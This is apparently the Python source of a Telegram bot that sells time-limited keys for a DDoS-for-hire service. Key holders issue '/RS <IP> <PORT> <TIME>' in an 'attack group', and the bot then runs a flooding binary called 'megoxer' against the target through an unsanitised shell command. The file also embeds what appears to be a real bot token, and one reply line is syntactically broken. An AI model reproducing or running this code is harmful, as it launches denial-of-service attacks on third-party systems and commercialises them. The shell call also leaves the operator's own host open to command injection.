#!/usr/bin/python3
import telebot
import datetime
import subprocess
import threading
import random
import string
import pytz
import json
import os

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7053228704:AAFYb1L2ZgrYLUyJpBORaD9BH7PJLv_vAhA')

# ✅ GROUP AND ADMIN DETAILS
GROUP_ID = "-1002252633433"
ADMINS = ["7129010361"]

SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"

# ✅ FILE PATHS
USER_FILE = "users.txt"
KEY_FILE = "keys.txt"
REDEEM_LOG_FILE = "redeem_log.json"

# ✅ Timezone सेट (IST)
IST = pytz.timezone('Asia/Kolkata')

# ✅ Redeem Log लोड/सेव फंक्शन
def load_redeem_log():
    try:
        with open(REDEEM_LOG_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_redeem_log(log):
    with open(REDEEM_LOG_FILE, "w") as file:
        json.dump(log, file)

redeem_log = load_redeem_log()

# ✅ Key और User डेटा लोड करने के फंक्शन
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        expiry = IST.localize(expiry)  # ✅ Fix: टाइमज़ोन जोड़ दिया
                        keys[key] = expiry
                    except ValueError:
                        print(f"⚠ Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def read_users():
    users = set()
    try:
        with open(USER_FILE, "r") as file:
            users = set(file.read().splitlines())
    except FileNotFoundError:
        pass
    return users

allowed_users = read_users()
keys = read_keys()

# ✅ Key Generate, Validate, Remove
def generate_key(days=0, hours=0):
    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)  # ✅ Fix: expiry अब सही से बन रहा है
    keys[new_key] = expiry
    write_keys(keys)
    return new_key

def validate_key(key):
    if key in keys and datetime.datetime.now(IST) < keys[key]:
        return True
    return False

def remove_key(key):
    if key in keys:
        del keys[key]
        write_keys(keys)
        return True
    return False

# ✅ /GENKEY Command (Admin Only)
# ✅ /GENKEY Command (Admin Only) - Now Generates Keys in "1H-RSVIP-XXXXXX" Format
@bot.message_handler(commands=['genkey'])
def generate_new_key(message):
    if str(message.chat.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /genkey <DAYS> [HOURS]")
        return

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0  # ✅ अब घंटे भी ऐड हो सकते हैं
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    # ✅ अब की का फॉर्मेट सही बनाते हैं
    if days > 0 and hours == 0:
        prefix = f"{days}D-RSVIP"
    elif hours > 0 and days == 0:
        prefix = f"{hours}H-RSVIP"
    else:
        prefix = f"{days}D{hours}H-RSVIP"

    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))  # ✅ 6 Random Characters
    new_key = f"{prefix}-{random_part}"

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

# ✅ /REMOVEKEY Command (Admin Only)
@bot.message_handler(commands=['removekey'])
def remove_existing_key(message):
    if str(message.chat.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /removekey <KEY>")
        return

    if remove_key(command[1]):
        bot.reply_to(message, "✅ KEY REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, "❌ KEY NOT FOUND!")

# ✅ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id

    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!**"
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")
    
    bot.reply_to(message, "✅ SCREENSHOT FORWARDED SUCCESSFULLY!")

# ✅ Active Attacks को Track करने वाला Dictionary  
active_attacks = {}

# ✅ /REDEEM Command (User Access)
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /redeem <KEY>")
        return

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name  
    key = command[1]

    # ✅ पहले से Redeemed Check करो
    for uid, k in redeem_log.items():
        if k == key:
            bot.reply_to(message, f"❌ THIS KEY HAS ALREADY BEEN REDEEMED!\n👤 **User:** `{uid}`\n🆔 **User ID:** `{uid}`", parse_mode="Markdown")
            return

    # ✅ पहले Key Valid है या नहीं चेक करो
    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY! 🔑")  # ✅ अब अलग से INVALID KEY दिखेगा
        return

    # ✅ Expiry Check करो
    expiry_date = keys[key]
    if datetime.datetime.now(IST) > expiry_date:
        del keys[key]  # ✅ Expired Key हटाओ
        write_keys(keys)
        bot.reply_to(message, f"⏳ THIS KEY HAS **EXPIRED!**\n📅 **Expired On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ✅ अब Key को इस User से लिंक कर दो
    allowed_users.add(user_id)
    redeem_log[user_id] = key
    save_redeem_log(redeem_log)

    with open(USER_FILE, "a") as file:
        file.write(f"{user_id}\n")

    bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")

## ✅ /RS Attack Command (Auto-Remove from /stats)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    if chat_id != GROUP_ID:
        bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
        return

    if user_id not in allowed_users:
        bot.reply_to(message, "❌ YOU NEED TO REDEEM A KEY FIRST!")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 240 SECONDS!")
        return

    if user_id not in active_attacks:
        active_attacks[user_id] = []

    if len(active_attacks[user_id]) >= 3:
        bot.reply_to(message, "❌ MAXIMUM 3 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
        return

    end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id].append((target, port, end_time))

    bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s" !  SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!)

    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.TimeoutExpired:
            bot.reply_to(message, "❌ ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ ATTACK FAILED!")

        # ✅ अटैक खत्म होते ही लिस्ट से हटा दो
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[0] != target]
        if not active_attacks[user_id]:  # अगर कोई अटैक बचा नहीं, तो एंट्री ही हटा दो
            del active_attacks[user_id]

    threading.Thread(target=attack_execution).start()

# ✅ /STATS Command - Shows Only Active Attacks
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    if str(message.chat.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    now = datetime.datetime.now(IST)

    # ✅ खत्म हुए अटैक हटाओ
    for user_id in list(active_attacks.keys()):
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[2] > now]
        if not active_attacks[user_id]:  # अगर कोई अटैक बचा नहीं, तो एंट्री ही हटा दो
            del active_attacks[user_id]

    if not active_attacks:
        bot.reply_to(message, "📊 No Active Attacks Right Now!")
        return

    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"

    for user_id, attacks in active_attacks.items():
        stats_message += f"👤 **User ID:** `{user_id}`\n"
        for target, port, end_time in attacks:
            remaining_time = (end_time - now).total_seconds()
            stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ /CHECK Command (List Active Keys)
@bot.message_handler(commands=['check'])
def check_keys(message):
    if str(message.chat.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    if not keys:
        bot.reply_to(message, "❌ NO ACTIVE KEYS!")
        return

    key_list = "🔑 **ACTIVE KEYS:**\n"
    for key, expiry in keys.items():
        key_list += f"🔹 `{key}` - 📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S IST')}\n"

    bot.reply_to(message, key_list, parse_mode="Markdown")

# ✅ BOT START (Load Data and Run)
bot.polling(none_stop=True)